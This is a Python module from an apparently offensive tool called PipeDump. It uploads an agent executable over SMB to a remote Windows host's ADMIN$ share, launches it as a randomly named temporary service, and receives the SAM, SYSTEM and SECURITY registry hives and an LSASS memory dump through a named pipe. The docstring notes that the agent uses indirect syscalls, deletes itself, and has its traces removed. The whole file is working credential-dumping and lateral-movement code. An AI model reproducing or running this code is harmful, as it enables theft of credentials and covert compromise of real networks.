"""Agent deployment and data retrieval.

PipeDump: upload native agent → named pipe → receive hives + LSASS dump.
"""

import secrets
import string
import struct
import time
import threading
from dataclasses import dataclass

from ..smb import SmbSession
from ..rpc.svcctl import SvcCtl


AGENT_MAGIC = b'PYD\x01'


def random_name(length: int = 8) -> str:
    return "".join(secrets.choice(string.ascii_lowercase) for _ in range(length))


@dataclass
class AgentResult:
    """Structured output from the agent."""
    system_hive: bytes
    sam_hive: bytes
    security_hive: bytes
    lsass_dump: bytes  # empty if PID=0


class PipeDump:
    """Deploy the native agent and receive registry hives + LSASS dump.

    The agent:
    1. Enables SeBackupPrivilege
    2. RegSaveKey SYSTEM/SAM/SECURITY → reads into memory → deletes temp files
    3. If PID > 0: reads LSASS memory via indirect syscalls
    4. Streams everything through a named pipe
    5. Self-deletes from disk

    Wire protocol:
      "PYD\\x01" (4-byte magic)
      <u32 system_size><system_data>
      <u32 sam_size><sam_data>
      <u32 security_size><security_data>
      <remaining bytes = LSASS MDMP>
    """

    def __init__(self, session: SmbSession, agent_path: str):
        self.session = session
        self.agent_path = agent_path

    def execute(self, lsass_pid: int = 0) -> AgentResult:
        pipe_name = random_name(12)
        svc_name = random_name(10)
        agent_name = f"{random_name()}.exe"

        self._upload_agent(agent_name)
        binary_path = f"C:\\Windows\\Temp\\{agent_name} {lsass_pid} {pipe_name}"

        t = threading.Thread(target=self._exec_via_service, args=(svc_name, binary_path), daemon=True)
        t.start()

        try:
            raw = self._read_pipe_with_retry(pipe_name, timeout=60)
        finally:
            t.join(timeout=10)
            try:
                self.session.delete_file("ADMIN$", f"Temp\\{agent_name}")
            except Exception:
                pass

        return self._parse_output(raw)

    def find_lsass_pid(self) -> int:
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            svc_handle = svc.open_service("SamSs")
            pid = svc.query_service_pid(svc_handle)
            svc.close_handle(svc_handle)
            return pid

    def _parse_output(self, data: bytes) -> AgentResult:
        if len(data) < 4 or data[:4] != AGENT_MAGIC:
            raise RuntimeError("Invalid agent output (bad magic)")

        offset = 4
        hives = []
        for name in ("SYSTEM", "SAM", "SECURITY"):
            if offset + 4 > len(data):
                raise RuntimeError(f"Truncated agent output ({name} size)")
            size = struct.unpack_from("<I", data, offset)[0]
            offset += 4
            if offset + size > len(data):
                raise RuntimeError(f"Truncated agent output ({name} data)")
            hives.append(data[offset:offset + size])
            offset += size

        lsass_dump = data[offset:]
        if lsass_dump and lsass_dump[:4] != b"MDMP":
            lsass_dump = b""

        return AgentResult(
            system_hive=hives[0],
            sam_hive=hives[1],
            security_hive=hives[2],
            lsass_dump=lsass_dump,
        )

    def _exec_via_service(self, svc_name: str, cmd: str) -> None:
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            svc_handle = svc.create_service(
                service_name=svc_name,
                display_name=svc_name,
                binary_path=cmd,
            )
            try:
                svc.start_service(svc_handle)
            except RuntimeError:
                pass
            try:
                svc.delete_service(svc_handle)
            except RuntimeError:
                pass
            svc.close_handle(svc_handle)

    def _upload_agent(self, agent_name: str) -> None:
        from smbprotocol.open import (
            Open, CreateDisposition, CreateOptions,
            FileAttributes, FilePipePrinterAccessMask, ImpersonationLevel,
        )

        with open(self.agent_path, "rb") as f:
            agent_data = f.read()

        tree = self.session.tree_connect("ADMIN$")
        fh = Open(tree, f"Temp\\{agent_name}")
        fh.create(
            impersonation_level=ImpersonationLevel.Impersonation,
            desired_access=FilePipePrinterAccessMask.GENERIC_WRITE,
            file_attributes=FileAttributes.FILE_ATTRIBUTE_NORMAL,
            share_access=0,
            create_disposition=CreateDisposition.FILE_OVERWRITE_IF,
            create_options=CreateOptions.FILE_NON_DIRECTORY_FILE,
        )
        offset = 0
        while offset < len(agent_data):
            chunk = agent_data[offset:offset + 65536]
            fh.write(chunk, offset)
            offset += len(chunk)
        fh.close(get_attributes=False)

    def _read_pipe_with_retry(self, pipe_name: str, timeout: int = 60) -> bytes:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                with self.session.open_pipe(pipe_name) as pipe:
                    chunks = []
                    while True:
                        try:
                            chunk = pipe.read(65536)
                            if not chunk:
                                break
                            chunks.append(chunk)
                        except Exception:
                            break
                    return b"".join(chunks)
            except Exception:
                time.sleep(1)
        raise RuntimeError(f"Timeout connecting to agent pipe '{pipe_name}'")
